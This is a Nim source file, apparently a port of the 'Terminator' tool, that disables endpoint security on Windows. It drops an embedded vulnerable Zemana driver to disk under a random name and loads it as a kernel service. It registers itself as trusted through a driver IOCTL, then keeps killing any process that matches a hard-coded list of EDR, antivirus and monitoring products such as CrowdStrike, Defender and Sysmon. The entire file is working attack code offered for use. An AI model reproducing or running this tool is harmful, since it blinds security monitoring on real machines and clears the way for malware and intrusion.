#[
    A port of the Terminator project to nim.
    
    Refference:
        https://github.com/ZeroMemoryEx/Terminator/blob/master/Terminator/Terminator.cpp

]#

import winim/inc/[windef, winbase, tlhelp32, winsvc]
import winim/winstr
import random, unicode, strutils
import os

const
    IOCTL_REGISTER_PROCESS:DWORD = 0x80002010'i32
    IOCTL_TERMINATE_PROCESS:DWORD = 0x80002048'i32
    SVC_NAME: string = "zTerm"
    DEV_NAME: string = "\\\\.\\ZemanaAntiMalware"
    ZEM = slurp("2a3ce41bb2a7894d939fbd1b20dae5a0.bin") # https://www.loldrivers.io/drivers/e5f12b82-8d07-474e-9587-8c7b3714d60c/
    CHARSET = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

let EDR_LIST: seq[string] = @[
    "activeconsole", "anti malware",    "anti-malware",
    "antimalware",   "anti virus",      "anti-virus",
    "antivirus",     "appsense",        "authtap",
    "avast",         "avecto",          "canary",
    "carbonblack",   "carbon black",    "cb",
    "ciscoamp",      "cisco amp",       "countercept",
    "countertack",   "cramtray",        "crssvc",
    "crowdstrike",   "csagent",         "csfalcon",
    "csshell",       "cybereason",      "cyclorama",
    "cylance",       "cyoptics",        "cyupdate",
    "cyvera",        "cyserver",        "cytray",
    "darktrace",     "defendpoint",     "defender",
    "eectrl",        "elastic",         "endgame",
    "f-secure",      "forcepoint",      "fireeye",
    "groundling",    "GRRservic",       "inspector",
    "ivanti",        "kaspersky",       "lacuna",
    "logrhythm",     "malware",         "mandiant",
    "mcafee",        "morphisec",       "msascuil",
    "msmpeng",       "nissrv",          "omni",
    "omniagent",     "osquery",         "palo alto networks",
    "pgeposervice",  "pgsystemtray",    "privilegeguard",
    "procwall",      "protectorservic", "qradar",
    "redcloak",      "secureworks",     "securityhealthservice",
    "semlaunchsv",   "sentinel",        "sepliveupdat",
    "sisidsservice", "sisipsservice",   "sisipsutil",
    "smc",           "smcgui",          "snac64",
    "sophos",        "splunk",          "srtsp",
    "symantec",      "symcorpu",        "symefasi",
    "sysinternal",   "sysmon",          "tanium",
    "tda",           "tdawork",         "tpython",
    "vectra",        "wincollect",      "windowssensor",
    "wireshark",     "threat",          "xagt",
    "xagtnotif" ,    "mssense"]

proc genRandString(length: int): string =
  var r: string
  for _ in 0..<length:
    r.add(sample(CHARSET))
  return r

proc loadDriver(driverPath: wstring): bool =
    var
        hSCM = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS)
        hService = OpenService(hSCM, cast[LPCWSTR](addr newWideCString(SVC_NAME)[0]), SERVICE_ALL_ACCESS)
    
    # Check if the service already exists
    if hService != cast[HANDLE](NULL):
        echo "[-] Service already exists"
        var svcStatus: SERVICE_STATUS
        if not bool(QueryServiceStatus(hService, addr svcStatus)):
            CloseServiceHandle(hService)
            CloseServiceHandle(hSCM)
            echo "[x] Failed to query service"
            return false
        if svcStatus.dwCurrentState == SERVICE_STOPPED:
            if not bool(StartService(hService, 0, NULL)):
                CloseServiceHandle(hService)
                CloseServiceHandle(hSCM)
                echo "[x] Failed to start service"
                return false
            echo "[*] Starting service"
        CloseServiceHandle(hService);
        CloseServiceHandle(hSCM);
        return true

    # Create the service
    hService = CreateService(
        hSCM,
        cast[LPCWSTR](addr newWideCString(SVC_NAME)[0]),
        cast[LPCWSTR](addr newWideCString(SVC_NAME)[0]),
        SERVICE_ALL_ACCESS,
        SERVICE_KERNEL_DRIVER,
        SERVICE_DEMAND_START,
        SERVICE_ERROR_IGNORE,
        cast[LPCWSTR](addr newWideCString(driverPath)[0]),
        NULL, NULL, NULL, NULL, NULL)
    
    if hService == cast[HANDLE](NULL):
        CloseServiceHandle(hSCM)
        echo "[x] Failed to create service"
        return false

    echo "[*] Service created"

    if not bool(StartService(hService, 0, NULL)):
        CloseServiceHandle(hService)
        CloseServiceHandle(hSCM)
        echo "[x] Failed to start service"
        return false
    echo "[*] Starting service"
    CloseServiceHandle(hService)
    CloseServiceHandle(hSCM)
    return true

proc checkEDRProcesses(hDevice: HANDLE): bool =
    var
        pOutbuff:uint
        bytesRet: DWORD
        hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)

    if hSnap == INVALID_HANDLE_VALUE:
        echo "[x] Failed to create toolhelp32snapshot"
        return false
    
    var procEntry: PROCESSENTRY32; procEntry.dwSize = DWORD(sizeof(PROCESSENTRY32))
    var
        bContinue = Process32First(hSnap, addr procEntry)
        pid: DWORD

    while(bool(bContinue)):
        # Build a nim string, this is probably more expensive then it needs to be but oh well I dropped out of CS lol
        var i = 0
        var exeName = ""
        while true:
            if char(procEntry.szExeFile[i]) == cast[char](nil): break
            exeName = exeName & $char(procEntry.szExeFile[i])
            i += 1
        exeName = exeName.toLower()
        exeName = exeName.replace(".exe")
        # String compare
        if exeName in EDR_LIST:
            pid = procEntry.th32ProcessID
            if bool(DeviceIoControl(
                    hDevice,
                    IOCTL_TERMINATE_PROCESS,
                    addr pid,
                    sizeof(pid).DWORD,
                    addr pOutbuff,
                    sizeof(pOutbuff).DWORD,
                    addr bytesRet,
                    NULL)):
                        echo "[!] Terminated ", $exeName
            else:
                echo "[x] Failed to terminate ", $exeName

        if not bool(Process32Next(hSnap, addr procEntry)):
            bContinue = FALSE

    CloseHandle(hSnap)
    return true

when isMainModule:
    # Write the driver to disk with a random name
    randomize()
    var zName = genRandString(rand(3..13)) & ".sys"
    writeFile(zName, ZEM)

    var
        fileData: WIN32_FIND_DATA
        fullDriverPath: array[MAX_PATH, WCHAR]
        hFind = FindFirstFile(cast[LPCWSTR](addr newWideCString(zName)[0]), addr fileData)
        sFullDriverPath = ""
    
    if hFind == INVALID_HANDLE_VALUE: # file is not found
        echo "[x] Could not find driver on disk"
        quit(0)
    echo "[-] Found driver"
    
    if 0 != GetFullPathName(addr filedata.cFileName[0], MAX_PATH, addr fullDriverPath[0], NULL):
        var i = 0
        while true:
            if char(fullDriverPath[i]) == cast[char](nil): break
            sFullDriverPath = sFullDriverPath & $char(fullDriverPath[i])
            i += 1
        echo "[-] Driver path is ", sFullDriverPath
    else: echo "[x] Driver path not found"; quit(0)

    echo "[-] Loading driver..."

    if not loadDriver(+$sFullDriverPath):
        echo "[x] Failed to load driver"
        quit(0)
    
    echo "[*] Loaded driver"

    var hDevice = CreateFile(
        cast[LPCWSTR](addr newWideCString(DEV_NAME)[0]),
        GENERIC_WRITE or GENERIC_READ,
        0,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        cast[HANDLE](NULL))
    
    if hDevice == cast[HANDLE](NULL):
        echo "[x] Failed to open handle to driver"
        quit(0)
    
    # Register proc in trusted list
    var pid = GetCurrentProcessId()
    if  bool(DeviceIoControl(
        hDevice,
        IOCTL_REGISTER_PROCESS,
        addr pid,
        DWORD.sizeof.DWORD, # nim is silly
        NULL,
        0,
        NULL,
        NULL)):
            echo "[*] Process registered in trusted list"
    else:
        echo "[x] Failed to register process in trusted list"
        CloseHandle(hDevice)
        quit(0)

    echo "[*] Terminating EDR/XDR/AVs. Keep the program running to prevent windows service from restarting them..."
    
    while true:
        if not checkEDRProcesses(hDevice):
            sleep(1200)
        else:
            sleep(700)

    CloseHandle(hDevice)